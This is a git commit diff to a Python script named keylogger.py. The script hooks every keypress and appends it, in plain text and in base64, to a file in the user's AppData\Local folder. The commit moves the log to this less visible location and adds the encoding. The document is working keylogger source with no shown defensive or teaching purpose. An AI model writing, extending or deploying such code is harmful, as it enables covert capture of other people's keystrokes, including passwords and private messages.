8516b7709a03caa0609117ab0fc51d1acf880f5f
Wahagen <khwa@ATPF40CBWL.pwcglb.com>
2024-07-23 15:16:48 +0200

    Adding the python

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,22 @@
 import keyboard
+import os
+import base64
 
-log_file = "keylogs.txt"
+#print(os.path.expanduser('~'))
+username = str(os.environ.get('USERNAME')) #get Username
+#print(type(username))
+
+path = "C:\\Users\\{}\\AppData\\Local\\keylogs.txt".format(username)
+#print(path)
+
+#log_file = "eylogs.txt"
 
 def keylogger(event):
-    with open(log_file, 'a') as f:
+    with open(path, 'a') as f:
         f.write('{}\n'.format(event.name))
-        
+        key = str(event.name)
+        encoded = base64.b64encode(key.encode("UTF-8"))
+        f.write('{}\n'.format(encoded))
+
 keyboard.on_press(keylogger)
 keyboard.wait()
